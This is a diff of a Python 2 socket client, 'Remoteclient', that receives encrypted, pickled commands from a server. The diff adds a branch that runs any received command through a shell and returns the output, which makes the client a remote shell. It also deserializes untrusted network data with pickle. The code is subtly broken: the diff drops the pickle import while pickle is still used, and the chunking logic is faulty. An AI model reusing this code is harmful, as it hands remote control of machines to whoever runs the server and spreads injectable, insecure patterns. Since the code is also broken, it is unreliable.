@@ -10,9 +10,7 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from base64 import b64decode 
 import time
-from django.core.signing import b64_decode
-from test.test_datetime import PicklableFixedOffset
-from bsddb.test.test_dbtables import pickle
+import subprocess
 
 class Remoteclient:
     
@@ -51,15 +49,15 @@ class Remoteclient:
         self.exchangeKeys()
         while True:
             cmd=PKCS1_OAEP.new(self.RSAKey).decrypt((b64decode(pickle.loads(self.sock.recv(4096)))))
-            cmd=cmd.strip('~')
-            print "CMDD PRINT DATA"+cmd
+            if cmd:
+                cmd=cmd.strip('~')
+            else:
+                print "server closed connection"
             if cmd=="FT":
-                print "inside FT"
                 rdata=""
                 filename= self.receiveData()
-                print filename
                 while True:
-                    buf=(self.receiveData()).strip('~')
+                    buf=(self.receiveData())
                     if buf=="QUIT":
                         break
                     else:
@@ -68,18 +66,29 @@ class Remoteclient:
                     f.write(rdata)
             elif cmd=="EFS":
                 print "inside EFS"
-                print "EFS PRINT DATA"+self.receiveData()
+                print self.receiveData()
                 self.sendData("Send EFS Key")
                 self.sendData('QUIT')
+                
+                
             elif cmd=="CMD":
-                print "inside CMD"
-                print "CMD PRINT DATA"+self.receiveData()
+                cmd =(self.receiveData()).strip('~')
+                print "received command is : "+cmd
+                p = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+                stdout, stderr= p.communicate()
+                if str(stderr)=="None":
+                    print "inside stdout"
+                    self.sendData(stdout)
+                    self.sendData("QUIT")
+                else:
+                    self.sendData("Error Occured, Error Code is: "+str(stderr))
+                
             elif cmd=="SCP":
                 print "Inside SCP"
-                print "SCP PRINT DATA"+self.receiveData()
+                print self.receiveData()
             else:
                 print "inside else block"
-                print "ELSE PRINT DATA"+self.receiveData()
+                print self.receiveData()
             
     def receiveData(self):
         while 1:
@@ -95,23 +104,26 @@ class Remoteclient:
         self.sock.close()
                 
     def sendData(self, data):
-        key = open("serverKey", "r").read()
-        clientKey= RSA.importKey(key)
-        clientKey = PKCS1_OAEP.new(clientKey)
-        secretText=clientKey.encrypt(data)
+        key = open("serverKey", "r").read() 
+        serverKey= RSA.importKey(key)
+        serverKey = PKCS1_OAEP.new(serverKey)
         if(len(data)>100):
+            print "sending large data"
             for i in range(100,len(data),100):
-                secretText = key.encrypt(data[i-100:i])
+                secretText = serverKey.encrypt(data[i-100:i])
                 time.sleep(0.5)
                 self.sock.sendall(pickle.dumps(secretText.encode('base64')))
-                secretText=key.encrypt(data[(i):len(data)])
-                time.sleep(0.5)
-                self.sock.sendall(pickle.dumps(secretText.encode('base64')))
-        else:
-            while len(data)<100:
-                data+='0'
-            secretText=key.encrypt(data)
+            secretText=serverKey.encrypt(data[(i):len(data)])
+            time.sleep(0.5)
             self.sock.sendall(pickle.dumps(secretText.encode('base64')))
+            print "sent large data"
+        else:
+            print "sending small data"
+            while len(data)<100:
+                data+='~'
+            secretText=serverKey.encrypt(data)
+            self.sock.sendall(pickle.dumps(secretText.encode('base64')))
+            print "sent small data"
             
 
 
